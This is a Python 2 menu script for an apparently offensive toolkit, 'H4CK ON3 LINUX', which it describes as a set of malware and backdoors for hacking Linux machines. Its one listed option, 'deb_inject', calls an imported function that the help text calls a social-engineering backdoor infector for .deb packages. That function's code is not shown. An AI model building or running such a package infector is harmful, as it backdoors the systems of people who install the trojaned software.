import os 
import sys 
from time import sleep
import holsata

os.system("clear")
	
		
ascii =  """                                                                        
 _   _ _  _    ____ _  __   ___  _   _ _____   _     _ _   _ _   ___  __
| | | | || |  / ___| |/ /  / _ \| \ | |___ /  | |   / | \ | | | | \ \/ /
| |_| | || |_| |   | ' /  | | | |  \| | |_ \  | |   | |  \| | | | |\  / 
|  _  |__   _| |___| . \  | |_| | |\  |___) | | |___| | |\  | |_| |/  \ 
|_| |_|  |_|  \____|_|\_\  \___/|_| \_|____/  |_____|_|_| \_|\___//_/\_\
									                                                                
\t\t\t\t\t\t\t\tversion 0.1"""
print  "\033[0;31m" + ascii +"\033[0m"
print "\t\033[0;34m    Pentest T00LK1T Of Malwares And Backdoors For Linux\033[0m  "
print  ""
print  ""
print  ""

	
while True:
    comando = raw_input("\033[4;36mH.O.L\033[0m\033[0;36m==>\033[0m ")
    if comando == "deb_inject":
         holsata.debinject()
    if comando == "exit":
         os.system("clear")
         print "Thx For Usage ;)"
         sleep(0.5)
         sys.exit(0)
    if comando == "help":
         print "info\nlist_backdoor\nhelp(command)"
    if comando == "list_backdoor":
         print "deb_inject"
    if comando == "info":
         holsata.typing('Coded By M0NST4R\nSince 2014 - The Moment\n\t      +- Greatz For Brothers -+\nStealth - B43L - Plastyne - Fruidz - PR0S3X - SUPR3MO - JUNIN - Murilo Olivera II - Krypton - N1GM3R - Kyrat - Pablo Santhus - N8HT\n\n\nTool Created For Hack Linux Servers, computers, and etc, based On S.E.T\nWelcome to the darkside bitch!\n')
    if comando == "help(info)":
         print "Greatz and describe of software"
    if comando == "help(list_backdoor)":
         print "Listener Of Backdoors"
    if comando == "help(deb_inject)":
         print "Deb Auto Infector (Social Enginer Backdoor)"
    if comando == "help(help)":
         print "Preview Describe Of Commands"
